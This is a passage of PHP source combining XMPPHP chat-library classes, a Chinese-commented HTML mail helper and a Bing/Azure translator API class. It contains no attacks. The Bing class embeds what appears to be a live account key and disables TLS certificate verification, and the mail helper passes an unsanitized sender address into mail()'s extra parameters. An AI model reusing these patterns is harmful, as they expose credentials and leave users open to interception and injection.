 * @author       Michael Garvin <JID: gar@netflint.net>
 * @copyright  2008 Nathanael C. Fritz
 * @version     $Id$
 */
class XMPPHP_XMLObj {
        /**
         * Tag name
         *
         * @var string
         */
        public $name;
        
        /**
         * Namespace
         *
         * @var string
         */
        public $ns;
        
        /**
         * Attributes
         *
         * @var array
         */
        public $attrs = array();
        
        /**
         * Subs?
         *
         * @var array
         */
        public $subs = array();
        
        /**
         * Node data
         * 
         * @var string
         */
        public $data = '';

        /**
         * Constructor
         *
         * @param string $name
         * @param string $ns
         * @param array  $attrs
         * @param string $data
         */
        public function __construct($name, $ns = '', $attrs = array(), $data = '') {
                $this->name = strtolower($name);
                $this->ns   = $ns;
                if(is_array($attrs) && count($attrs)) {
                        foreach($attrs as $key => $value) {
                                $this->attrs[strtolower($key)] = $value;
                        }
                }
                $this->data = $data;
        }

        /**
         * Dump this XML Object to output.
         *
         * @param integer $depth
         */
        public function printObj($depth = 0) {
                print str_repeat("\t", $depth) . $this->name . " " . $this->ns . ' ' . $this->data;
                print "\n";
                foreach($this->subs as $sub) {
                        $sub->printObj($depth + 1);
                }
        }

        /**
         * Return this XML Object in xml notation
         *
         * @param string $str
         */
        public function toString($str = '') {
                $str .= "<{$this->name} xmlns='{$this->ns}' ";
                foreach($this->attrs as $key => $value) {
                        if($key != 'xmlns') {
                                $value = htmlspecialchars($value);
                                $str .= "$key='$value' ";
                        }
                }
                $str .= ">";
                foreach($this->subs as $sub) {
                        $str .= $sub->toString();
                }
                $body = htmlspecialchars($this->data);
                $str .= "$body</{$this->name}>";
                return $str;
        }

        /**
         * Has this XML Object the given sub?
         * 
         * @param string $name
         * @return boolean
         */
        public function hasSub($name, $ns = null) {
                foreach($this->subs as $sub) {
                        if(($name == "*" or $sub->name == $name) and ($ns == null or $sub->ns == $ns)) return true;
                }
                return false;
        }

        /**
         * Return a sub
         *
         * @param string $name
         * @param string $attrs
         * @param string $ns
         */
        public function sub($name, $attrs = null, $ns = null) {
                #TODO attrs is ignored
                foreach($this->subs as $sub) {
                        if($sub->name == $name and ($ns == null or $sub->ns == $ns)) {
                                return $sub;
                        }
                }
        }
}

/**
 * XMPPHP: The PHP XMPP Library
 * Copyright (C) 2008  Nathanael C. Fritz
 * This file is part of SleekXMPP.
 * 
 * XMPPHP is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 * 
 * XMPPHP is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with XMPPHP; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 *
 * @category   xmpphp 
 * @package     XMPPHP
 * @author       Nathanael C. Fritz <JID: fritzy@netflint.net>
 * @author       Stephan Wentz <JID: stephan@jabber.wentz.it>
 * @author       Michael Garvin <JID: gar@netflint.net>
 * @copyright  2008 Nathanael C. Fritz
 */

/**
 * XMPPHP Log
 * 
 * @package     XMPPHP
 * @author       Nathanael C. Fritz <JID: fritzy@netflint.net>
 * @author       Stephan Wentz <JID: stephan@jabber.wentz.it>
 * @author       Michael Garvin <JID: gar@netflint.net>
 * @copyright  2008 Nathanael C. Fritz
 * @version     $Id$
 */
class XMPPHP_Log {
        
        const LEVEL_ERROR   = 0;
        const LEVEL_WARNING = 1;
        const LEVEL_INFO        = 2;
        const LEVEL_DEBUG   = 3;
        const LEVEL_VERBOSE = 4;
        
        /**
         * @var array
         */
        protected $data = array();

        /**
         * @var array
         */
        protected $names = array('ERROR', 'WARNING', 'INFO', 'DEBUG', 'VERBOSE');

        /**
         * @var integer
         */
        protected $runlevel;

        /**
         * @var boolean
         */
        protected $printout;

        /**
         * Constructor
         *
         * @param boolean $printout
         * @param string  $runlevel
         */
        public function __construct($printout = false, $runlevel = self::LEVEL_INFO) {
                $this->printout = (boolean)$printout;
                $this->runlevel = (int)$runlevel;
        }

        /**
         * Add a message to the log data array
         * If printout in this instance is set to true, directly output the message
         *
         * @param string  $msg
         * @param integer $runlevel
         */
        public function log($msg, $runlevel = self::LEVEL_INFO) {
                $time = time();
                #$this->data[] = array($this->runlevel, $msg, $time);
                if($this->printout and $runlevel <= $this->runlevel) {
                        $this->writeLine($msg, $runlevel, $time);
                }
        }

        /**
         * Output the complete log.
         * Log will be cleared if $clear = true
         *
         * @param boolean $clear
         * @param integer $runlevel
         */
        public function printout($clear = true, $runlevel = null) {
                if($runlevel === null) {
                        $runlevel = $this->runlevel;
                }
                foreach($this->data as $data) {
                        if($runlevel <= $data[0]) {
                                $this->writeLine($data[1], $runlevel, $data[2]);
                        }
                }
                if($clear) {
                        $this->data = array();
                }
        }
        
        protected function writeLine($msg, $runlevel, $time) {
                //echo date('Y-m-d H:i:s', $time)." [".$this->names[$runlevel]."]: ".$msg."\n";
                echo $time." [".$this->names[$runlevel]."]: ".$msg."\n";
                flush();
        }
}

/**
 * XMPPHP: The PHP XMPP Library
 * Copyright (C) 2008  Nathanael C. Fritz
 * This file is part of SleekXMPP.
 * 
 * XMPPHP is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 * 
 * XMPPHP is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with XMPPHP; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 *
 * @category   xmpphp 
 * @package     XMPPHP
 * @author       Nathanael C. Fritz <JID: fritzy@netflint.net>
 * @author       Stephan Wentz <JID: stephan@jabber.wentz.it>
 * @author       Michael Garvin <JID: gar@netflint.net>
 * @copyright  2008 Nathanael C. Fritz
 */

/**
 * XMPPHP Roster Object
 * 
 * @category   xmpphp 
 * @package     XMPPHP
 * @author       Nathanael C. Fritz <JID: fritzy@netflint.net>
 * @author       Stephan Wentz <JID: stephan@jabber.wentz.it>
 * @author       Michael Garvin <JID: gar@netflint.net>
 * @copyright  2008 Nathanael C. Fritz
 * @version     $Id$
 */

class Roster {
        /**
         * Roster array, handles contacts and presence.  Indexed by jid.
         * Contains array with potentially two indexes 'contact' and 'presence'
         * @var array
         */
        protected $roster_array = array();
        /**
         * Constructor
         * 
         */
        public function __construct($roster_array = array()) {
                if ($this->verifyRoster($roster_array)) {
                        $this->roster_array = $roster_array; //Allow for prepopulation with existing roster
                } else {
                        $this->roster_array = array();
                }
        }

        /**
         *
         * Check that a given roster array is of a valid structure (empty is still valid)
         *
         * @param array $roster_array
         */
        protected function verifyRoster($roster_array) {
                #TODO once we know *what* a valid roster array looks like
                return True;
        }

        /**
         *
         * Add given contact to roster
         *
         * @param string $jid
         * @param string $subscription
         * @param string $name
         * @param array $groups
         */
        public function addContact($jid, $subscription, $name='', $groups=array()) {
                $contact = array('jid' => $jid, 'subscription' => $subscription, 'name' => $name, 'groups' => $groups);
                if ($this->isContact($jid)) {
                        $this->roster_array[$jid]['contact'] = $contact;
                } else {
                        $this->roster_array[$jid] = array('contact' => $contact);
                }
        }

        /**
         * 
         * Retrieve contact via jid
         *
         * @param string $jid
         */
        public function getContact($jid) {
                if ($this->isContact($jid)) {
                        return $this->roster_array[$jid]['contact'];
                }
        }

        /**
         *
         * Discover if a contact exists in the roster via jid
         *
         * @param string $jid
         */
        public function isContact($jid) {
                return (array_key_exists($jid, $this->roster_array));
        }

        /**
         *
         * Set presence
         *
         * @param string $presence
         * @param integer $priority
         * @param string $show
         * @param string $status
        */
        public function setPresence($presence, $priority, $show, $status) {
                list($jid, $resource) = split("/", $presence);
                if ($show != 'unavailable') {
                        if (!$this->isContact($jid)) {
                                $this->addContact($jid, 'not-in-roster');
                        }
                        $resource = $resource ? $resource : '';
                        $this->roster_array[$jid]['presence'][$resource] = array('priority' => $priority, 'show' => $show, 'status' => $status);
                } else { //Nuke unavailable resources to save memory
                        unset($this->roster_array[$jid]['resource'][$resource]);
                }
        }

        /*
         *
         * Return best presence for jid
         *
         * @param string $jid
         */
        public function getPresence($jid) {
                $split = split("/", $jid);
                $jid = $split[0];
                if($this->isContact($jid)) {
                        $current = array('resource' => '', 'active' => '', 'priority' => -129, 'show' => '', 'status' => ''); //Priorities can only be -128 = 127
                        foreach($this->roster_array[$jid]['presence'] as $resource => $presence) {
                                //Highest available priority or just highest priority
                                if ($presence['priority'] > $current['priority'] and (($presence['show'] == "chat" or $presence['show'] == "available") or ($current['show'] != "chat" or $current['show'] != "available"))) {
                                        $current = $presence;
                                        $current['resource'] = $resource;
                                }
                        }
                        return $current;
                }
        }
        /**
         *
         * Get roster
         *
         */
        public function getRoster() {
                return $this->roster_array;
        }
}

/**
 * XMPPHP: The PHP XMPP Library
 * Copyright (C) 2008  Nathanael C. Fritz
 * This file is part of SleekXMPP.
 * 
 * XMPPHP is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 * 
 * XMPPHP is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with XMPPHP; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 *
 * @category   xmpphp 
 * @package     XMPPHP
 * @author       Nathanael C. Fritz <JID: fritzy@netflint.net>
 * @author       Stephan Wentz <JID: stephan@jabber.wentz.it>
 * @author       Michael Garvin <JID: gar@netflint.net>
 * @copyright  2008 Nathanael C. Fritz
 */

/** XMPPHP_XMLStream */
//require_once dirname(__FILE__) . "/XMLStream.php";
//require_once dirname(__FILE__) . "/Roster.php";

/**
 * XMPPHP Main Class
 * 
 * @category   xmpphp 
 * @package     XMPPHP
 * @author       Nathanael C. Fritz <JID: fritzy@netflint.net>
 * @author       Stephan Wentz <JID: stephan@jabber.wentz.it>
 * @author       Michael Garvin <JID: gar@netflint.net>
 * @copyright  2008 Nathanael C. Fritz
 * @version     $Id$
 */
class XMPPHP_XMPP extends XMPPHP_XMLStream {
        /**
         * @var string
         */
        public $server;

        /**
         * @var string
         */
        public $user;
        
        /**
         * @var string
         */
        protected $password;
        
        /**
         * @var string
         */
        protected $resource;
        
        /**
         * @var string
         */
        protected $fulljid;
        
        /**
         * @var string
         */
        protected $basejid;
        
        /**
         * @var boolean
         */
        protected $authed = false;
        protected $session_started = false;
        
        /**
         * @var boolean
         */
        protected $auto_subscribe = false;
        
        /**
         * @var boolean
         */
        protected $use_encryption = true;
        
        /**
         * @var boolean
         */
        public $track_presence = true;
        
        /**
         * @var object
         */
        public $roster;

        /**
         * Constructor
         *
         * @param string  $host
         * @param integer $port
         * @param string  $user
         * @param string  $password
         * @param string  $resource
         * @param string  $server
         * @param boolean $printlog
         * @param string  $loglevel
         */
        public function __construct($host, $port, $user, $password, $resource, $server = null, $printlog = false, $loglevel = null) {
                parent::__construct($host, $port, $printlog, $loglevel);
                
                $this->user      = $user;
                $this->password = $password;
                $this->resource = $resource;
                if(!$server) $server = $host;
                $this->basejid = $this->user . '@' . $this->host;

                $this->roster = new Roster();
                $this->track_presence = true;

                $this->stream_start = '<stream:stream to="' . $server . '" xmlns:stream="http://etherx.jabber.org/streams" xmlns="jabber:client" version="1.0">';
                $this->stream_end   = '</stream:stream>';
                $this->default_ns   = 'jabber:client';
                
                $this->addXPathHandler('{http://etherx.jabber.org/streams}features', 'features_handler');
                $this->addXPathHandler('{urn:ietf:params:xml:ns:xmpp-sasl}success', 'sasl_success_handler');
                $this->addXPathHandler('{urn:ietf:params:xml:ns:xmpp-sasl}failure', 'sasl_failure_handler');
                $this->addXPathHandler('{urn:ietf:params:xml:ns:xmpp-tls}proceed', 'tls_proceed_handler');
                $this->addXPathHandler('{jabber:client}message', 'message_handler');
                $this->addXPathHandler('{jabber:client}presence', 'presence_handler');
                $this->addXPathHandler('iq/{jabber:iq:roster}query', 'roster_iq_handler');
        }

        /**
         * Turn encryption on/ff
         *
         * @param boolean $useEncryption
         */
        public function useEncryption($useEncryption = true) {
                $this->use_encryption = $useEncryption;
        }
        
        /**
         * Turn on auto-authorization of subscription requests.
         *
         * @param boolean $autoSubscribe
         */
        public function autoSubscribe($autoSubscribe = true) {
                $this->auto_subscribe = $autoSubscribe;
        }

        /**
         * Send XMPP Message
         *
         * @param string $to
         * @param string $body
         * @param string $type
         * @param string $subject
         */
        public function message($to, $body, $type = 'chat', $subject = null, $payload = null) {
            if(is_null($type))
            {
                $type = 'chat';
            }
            
                $to       = htmlspecialchars($to);
                $body   = htmlspecialchars($body);
                $subject = htmlspecialchars($subject);
                
                $out = "<message from=\"{$this->fulljid}\" to=\"$to\" type='$type'>";
                if($subject) $out .= "<subject>$subject</subject>";
                $out .= "<body>$body</body>";
                if($payload) $out .= $payload;
                $out .= "</message>";
                
                $this->send($out);
        }

        /**
         * Set Presence
         *
         * @param string $status
         * @param string $show
         * @param string $to
         */
        public function presence($status = null, $show = 'available', $to = null, $type='available', $priority=0) {
                if($type == 'available') $type = '';
                $to      = htmlspecialchars($to);
                $status = htmlspecialchars($status);
                if($show == 'unavailable') $type = 'unavailable';
                
                $out = "<presence";
                if($to) $out .= " to=\"$to\"";
                if($type) $out .= " type='$type'";
                if($show == 'available' and !$status) {
                        $out .= "/>";
                } else {
                        $out .= ">";
                        if($show != 'available') $out .= "<show>$show</show>";
                        if($status) $out .= "<status>$status</status>";
                        if($priority) $out .= "<priority>$priority</priority>";
                        $out .= "</presence>";
                }
                
                $this->send($out);
        }
        /**
         * Send Auth request
         *
         * @param string $jid
         */
        public function subscribe($jid) {
                $this->send("<presence type='subscribe' to='{$jid}' from='{$this->fulljid}' />");
                #$this->send("<presence type='subscribed' to='{$jid}' from='{$this->fulljid}' />");
        }

        /**
         * Message handler
         *
         * @param string $xml
         */
        public function message_handler($xml) {
                if(isset($xml->attrs['type'])) {
                        $payload['type'] = $xml->attrs['type'];
                } else {
                        $payload['type'] = 'chat';
                }
                $payload['from'] = $xml->attrs['from'];
                $payload['body'] = $xml->sub('body')->data;
                $payload['xml'] = $xml;
                $this->log->log("Message: {$xml->sub('body')->data}", XMPPHP_Log::LEVEL_DEBUG);
                $this->event('message', $payload);
        }

        /**
         * Presence handler
         *
         * @param string $xml
         */
        public function presence_handler($xml) {
                $payload['type'] = (isset($xml->attrs['type'])) ? $xml->attrs['type'] : 'available';
                $payload['show'] = (isset($xml->sub('show')->data)) ? $xml->sub('show')->data : $payload['type'];
                $payload['from'] = $xml->attrs['from'];
                $payload['status'] = (isset($xml->sub('status')->data)) ? $xml->sub('status')->data : '';
                $payload['priority'] = (isset($xml->sub('priority')->data)) ? intval($xml->sub('priority')->data) : 0;
                $payload['xml'] = $xml;
                if($this->track_presence) {
                        $this->roster->setPresence($payload['from'], $payload['priority'], $payload['show'], $payload['status']);
                }
                $this->log->log("Presence: {$payload['from']} [{$payload['show']}] {$payload['status']}",  XMPPHP_Log::LEVEL_DEBUG);
                if(array_key_exists('type', $xml->attrs) and $xml->attrs['type'] == 'subscribe') {
                        if($this->auto_subscribe) {
                                $this->send("<presence type='subscribed' to='{$xml->attrs['from']}' from='{$this->fulljid}' />");
                                $this->send("<presence type='subscribe' to='{$xml->attrs['from']}' from='{$this->fulljid}' />");
                        }
                        $this->event('subscription_requested', $payload);
                } elseif(array_key_exists('type', $xml->attrs) and $xml->attrs['type'] == 'subscribed') {
                        $this->event('subscription_accepted', $payload);
                } else {
                        $this->event('presence', $payload);
                }
        }

        /**
         * Features handler
         *
         * @param string $xml
         */
        protected function features_handler($xml) {
                if($xml->hasSub('starttls') and $this->use_encryption) {
                        $this->send("<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'><required /></starttls>");
                } elseif($xml->hasSub('bind') and $this->authed) {
                        $id = $this->getId();
                        $this->addIdHandler($id, 'resource_bind_handler');
                        $this->send("<iq xmlns=\"jabber:client\" type=\"set\" id=\"$id\"><bind xmlns=\"urn:ietf:params:xml:ns:xmpp-bind\"><resource>{$this->resource}</resource></bind></iq>");
                } else {
                        $this->log->log("Attempting Auth...");
                        if ($this->password) {
                        $this->send("<auth xmlns='urn:ietf:params:xml:ns:xmpp-sasl' mechanism='PLAIN'>" . base64_encode("\x00" . $this->user . "\x00" . $this->password) . "</auth>");
                        } else {
                        $this->send("<auth xmlns='urn:ietf:params:xml:ns:xmpp-sasl' mechanism='ANONYMOUS'/>");
                        }       
                }
        }

        /**
         * SASL success handler
         *
         * @param string $xml
         */
        protected function sasl_success_handler($xml) {
                $this->log->log("Auth success!");
                $this->authed = true;
                $this->reset();
        }
        
        /**
         * SASL feature handler
         *
         * @param string $xml
         */
        protected function sasl_failure_handler($xml) {
                $this->log->log("Auth failed!",  XMPPHP_Log::LEVEL_ERROR);
                $this->disconnect();
                
                throw new XMPPHP_Exception('Auth failed!');
        }

        /**
         * Resource bind handler
         *
         * @param string $xml
         */
        protected function resource_bind_handler($xml) {
                if($xml->attrs['type'] == 'result') {
                        $this->log->log("Bound to " . $xml->sub('bind')->sub('jid')->data);
                        $this->fulljid = $xml->sub('bind')->sub('jid')->data;
                        $jidarray = explode('/',$this->fulljid);
                        $this->jid = $jidarray[0];
                }
                $id = $this->getId();
                $this->addIdHandler($id, 'session_start_handler');
                $this->send("<iq xmlns='jabber:client' type='set' id='$id'><session xmlns='urn:ietf:params:xml:ns:xmpp-session' /></iq>");
        }

        /**
        * Retrieves the roster
        *
        */
        public function getRoster() {
                $id = $this->getID();
                $this->send("<iq xmlns='jabber:client' type='get' id='$id'><query xmlns='jabber:iq:roster' /></iq>");
        }

        /**
        * Roster iq handler
        * Gets all packets matching XPath "iq/{jabber:iq:roster}query'
        *
        * @param string $xml
        */
        protected function roster_iq_handler($xml) {
                $status = "result";
                $xmlroster = $xml->sub('query');
                foreach($xmlroster->subs as $item) {
                        $groups = array();
                        if ($item->name == 'item') {
                                $jid = $item->attrs['jid']; //REQUIRED
                                $name = $item->attrs['name']; //MAY
                                $subscription = $item->attrs['subscription'];
                                foreach($item->subs as $subitem) {
                                        if ($subitem->name == 'group') {
                                                $groups[] = $subitem->data;
                                        }
                                }
                                $contacts[] = array($jid, $subscription, $name, $groups); //Store for action if no errors happen
                        } else {
                                $status = "error";
                        }
                }
                if ($status == "result") { //No errors, add contacts
                        foreach($contacts as $contact) {
                                $this->roster->addContact($contact[0], $contact[1], $contact[2], $contact[3]);
                        }
                }
                if ($xml->attrs['type'] == 'set') {
                        $this->send("<iq type=\"reply\" id=\"{$xml->attrs['id']}\" to=\"{$xml->attrs['from']}\" />");
                }
        }

        /**
         * Session start handler
         *
         * @param string $xml
         */
        protected function session_start_handler($xml) {
                $this->log->log("Session started");
                $this->session_started = true;
                $this->event('session_start');
        }

        /**
         * TLS proceed handler
         *
         * @param string $xml
         */
        protected function tls_proceed_handler($xml) {
                $this->log->log("Starting TLS encryption");
                stream_socket_enable_crypto($this->socket, true, STREAM_CRYPTO_METHOD_SSLv23_CLIENT);
                $this->reset();
        }

        /**
        * Retrieves the vcard
        *
        */
        public function getVCard($jid = Null) {
                $id = $this->getID();
                $this->addIdHandler($id, 'vcard_get_handler');
                if($jid) {
                        $this->send("<iq type='get' id='$id' to='$jid'><vCard xmlns='vcard-temp' /></iq>");
                } else {
                        $this->send("<iq type='get' id='$id'><vCard xmlns='vcard-temp' /></iq>");
                }
        }

        /**
        * VCard retrieval handler
        *
        * @param XML Object $xml
        */
        protected function vcard_get_handler($xml) {
                $vcard_array = array();
                $vcard = $xml->sub('vcard');
                // go through all of the sub elements and add them to the vcard array
                foreach ($vcard->subs as $sub) {
                        if ($sub->subs) {
                                $vcard_array[$sub->name] = array();
                                foreach ($sub->subs as $sub_child) {
                                        $vcard_array[$sub->name][$sub_child->name] = $sub_child->data;
                                }
                        } else {
                                $vcard_array[$sub->name] = $sub->data;
                        }
                }
                $vcard_array['from'] = $xml->attrs['from'];
                $this->event('vcard', $vcard_array);
        }
}

class mail_class{
// 对邮件地址进行中文的UTF-8编码转化
function format_mail_address($address,$codebase){
  if(preg_match("|<([^<]+)>|", $address, $matches)){
    $name = mb_substr($address, 0, strpos($address, '<'));
    $name = trim($name);
    $mail = $matches[1];
  	if (strtolower($codebase) == 'utf-8'){
    	$address = "=?UTF-8?B?".base64_encode($name)."?= " . "<$mail>";
  	}
  	elseif (strtolower($codebase) == 'gb2312'){	
    	$address = "=?gb2312?B?".base64_encode($name)."?= " . "<$mail>";
  	}    
  }
  return $address;
}

// 发送html格式的邮件
function html_mail($from, $to, $subject, $body, $codebase){
  if(preg_match("|<([^<]+)>|", $from, $matches)){
    $from_name = mb_substr($from, 0, strpos($from, '<'));
    $from_mail = $matches[1];
    if (strtolower($codebase) == 'utf-8'){
    	$from = "=?UTF-8?B?".base64_encode($from_name)."?= " . "<$from_mail>";
    }
    elseif (strtolower($codebase) == 'gb2312'){
    	$from = "=?gb2312?B?".base64_encode($from_name)."?= " . "<$from_mail>";
    }
  }else{
    $from_mail = $from;
  }
  $headers[] = "From: $from";
  $headers[] = "X-Mailer: PHP";
  $headers[] = "MIME-Version: 1.0";
  if (strtolower($codebase) == 'utf-8'){
  	$headers[] = "Content-type: text/html; charset=utf8";
  }
  elseif (strtolower($codebase) == 'gb2312'){
  	$headers[] = "Content-type: text/html; charset=gb2312";
  }  
  $headers[] = "Reply-To: $from_mail";
  if (strtolower($codebase) == 'utf-8'){
  	$subject = "=?UTF-8?B?".base64_encode($subject)."?=";
  }
  elseif (strtolower($codebase) == 'gb2312'){
  	$subject = "=?gb2312?B?".base64_encode($subject)."?=";
  }  

  if(is_array($to)){
    foreach($to as $mail)
      $to_mails[] = $this->format_mail_address($mail,$codebase);
    $to = join(", ", $to_mails);
  }
  mail($to, $subject, $body, join("\r\n", $headers), "-f $from_mail");
}

//函数使用可以参照下面的例子：
//html_mail(
//    "老谷自言自语 <admin@yorkgu.me>",
//    array(
//        "用户A <user1@gmail.com>",
//        "用户B <user2@163.com>"),
//    "这是一封测试邮件",
//    "<html><body><h1 style='color:red'>
//      感谢党，感谢政府，感谢大中华局域网，给我这个发送邮件的机会。
//    </h1></body></html>"
//);
}

?>

<?php 

// ----------------------------------------------------------------
//  Code.google.com - X3193-Google多用户多接口系统非标准独立类 v1.1
//  供能：实现多种接口调用，包括地图、相册、网址、日历等。
//  实现：X3193API
//  供应：google.com
//  收藏：☆☆☆☆☆
//  时间：2011-7-27 11:45AM
//  行数：45行
// ----------------------------------------------------------------
//  更新日志：
// ----------------------------------------------------------------
class bing_class{

var $accountkey = 'm6JvX/s5J8RF97Ip7um8pPRR0Kesh+G7HYSH/QiN3X0=';
var $accountid = '4c2d1744-d684-4155-ad91-955fdba57259';
var $agentid = 'X3193-WAM';

function bingsearchtype(){
	return "Web,网页|News,新闻|Image,图片|Translate,翻译";
}

function bingsearchmarket(){
	return "zh-CN,Chinese - China|zh-HK,Chinese - Hong Kong SAR|zh-TW,Chinese - Taiwan|ar-XA,Arabic - Arabia|bg-BG,Bulgarian - Bulgaria|cs-CZ,Czech - Czech Republic|da-DK,Danish - Denmark|de-AT,German - Austria|de-CH,German - Switzerland|de-DE,German - Germany|el-GR,Greek - Greece|en-AU,English - Australia|en-CA,English - Canada|en-GB,English - United Kingdom|en-ID,English - Indonesia|en-IE,English - Ireland|en-IN,English - India|en-MY,English - Malaysia|en-NZ,English - New Zealand|en-PH,English - Philippines|en-SG,English - Singapore|en-US,English - United States|en-XA,English - Arabia|en-ZA,English - South Africa|es-AR,Spanish - Argentina|es-CL,Spanish - Chile|es-ES,Spanish - Spain|es-MX,Spanish - Mexico|es-US,Spanish - United States|es-XL,Spanish - Latin America|et-EE,Estonian - Estonia|fi-FI,Finnish - Finland|fr-BE,French - Belgium|fr-CA,French - Canada|fr-CH,French - Switzerland|fr-FR,French - France|he-IL,Hebrew - Israel|hr-HR,Croatian - Croatia|hu-HU,Hungarian - Hungary|it-IT,Italian - Italy|ja-JP,Japanese - Japan|ko-KR,Korean - Korea|lt-LT,Lithuanian - Lithuania|lv-LV,Latvian - Latvia|nb-NO,Norwegian - Norway|nl-BE,Dutch - Belgium|nl-NL,Dutch - Netherlands|pl-PL,Polish - Poland|pt-BR,Portuguese - Brazil|pt-PT,Portuguese - Portugal|ro-RO,Romanian - Romania|ru-RU,Russian - Russia|sk-SK,Slovak - Slovak Republic|sl-SL,Slransovenian - Slovenia|sv-SE,Swedish - Sweden|th-TH,Thai - Thailand|tr-TR,Turkish - Turkey|uk-UA,Ukrainian - Ukraine";
}

function bingsearchlang(){
	return "Ar,Arabic|zh-CHS,简体中文|zh-CHT,繁w中文|Nl,Dutch|En,English|Fr,French|De,German|It,Italian|Ja,Japanese|Ko,Korean|Pl,Polish|Pt,Portuguese|Ru,Russian|Es,Spanish";
}

function bingsearchimagelist(){
	return "photo,缩略|list,列表";
}

function bingsearchcountrylang(){
	return "af,Afghanistan|ar,Arabic|bs-Latn,Bosnian (Latin)|bg,Bulgarian|ca,Catalan|zh-CHS,Chinese Simplified|zh-CHT,Chinese Traditional|hr,Croatian|cs,Czech|da,Danish|nl,Dutch|en,English|et,Estonian|fi,Finnish|fr,French|de,German|el,Greek|ht,Haitian Creole|he,Hebrew|hi,Hindi|mww,Hmong Daw|hu,Hungarian|id,Indonesian|it,Italian|ja,Japanese|sw,Kiswahili|tlh,Klingon|tlh-Qaak,Klingon (pIqaD)|ko,Korean|lv,Latvian|lt,Lithuanian|ms,Malay|mt,Maltese|yua,Yucatec Maya|no,Norwegian|otq,Querétaro Otomi|fa,Persian|pl,Polish|pt,Portuguese|ro,Romanian|ru,Russian|sr-Cyrl,Serbian (Cyrillic)|sr-Latn,Serbian (Latin)|sk,Slovak|sl,Slovenian|es,Spanish|sv,Swedish|th,Thai|tr,Turkish|uk,Ukrainian|ur,Urdu|vi,Vietnamese|cy,Cyprus";
}

function bingsearchcountrycode(){
	
		      $url = 'https://api.datamarket.azure.com/Bing/MicrosoftTranslator/v1/GetLanguagesForTranslation';
          $postdata = '';
          $header[] = "Content-Type: text/xml; charset=utf-8";
          $header[] = "Content-length: ".strlen($postdata);
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, $url);
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
          curl_setopt($ch, CURLOPT_USERPWD, $this->accountkey.':'.$this->accountkey);
          curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
          curl_setopt($ch, CURLOPT_POST, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);          
          curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
          $jsonarray = curl_exec($ch);
          //return($jsonarray); 
          curl_close($ch);
          
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        // 加Xml 文件    
                        $objXml->loadXML($jsonarray);
                        $objList = $objXml->getElementsByTagName("entry");
                        $langstr='';
                        //print_r($objList->length);
                        for($j=0; $j < $objList->length;$j++){
                        	$objHdd = $objList->item($j);
                        	$langs = $this->bingsearchcountrylang();
                        	for($k=0; $k < count(split("[|]",$langs));$k++){
                        		if(arrmember(split("[,]",arrmember(split("[|]",$langs),$k)),"0") == $objHdd->getElementsByTagName(arrmember(split("[:]","d:Code"),"1"))->item(0)->nodeValue){
                        			$clang = arrmember(split("[,]",arrmember(split("[|]",$langs),$k)),"1");
                        			break;
                        		}
                        		//$clang = arrmember(split("[,]",arrmember(split("[|]",$langs),$k)),"1");
                        	}
                        	//$clang = preg_replace("/.*[\|]?".$objHdd->getElementsByTagName(arrmember(split("[:]","d:Code"),"1"))->item(0)->nodeValue."[,]([^\||\,]+)[\|]?.*/", "$1", $langs);
                          if($j!=$objList->length-1)
                          	$langstr = $langstr.$objHdd->getElementsByTagName(arrmember(split("[:]","d:Code"),"1"))->item(0)->nodeValue.','.$clang.'|';
													elseif($j==$objList->length-1)
                          	$langstr = $langstr.$objHdd->getElementsByTagName(arrmember(split("[:]","d:Code"),"1"))->item(0)->nodeValue.','.$clang;
                        }
                        return $langstr;
	//https://msdn.microsoft.com/en-us/library/hh456380.aspx?f=255&MSPPError=-2147217396
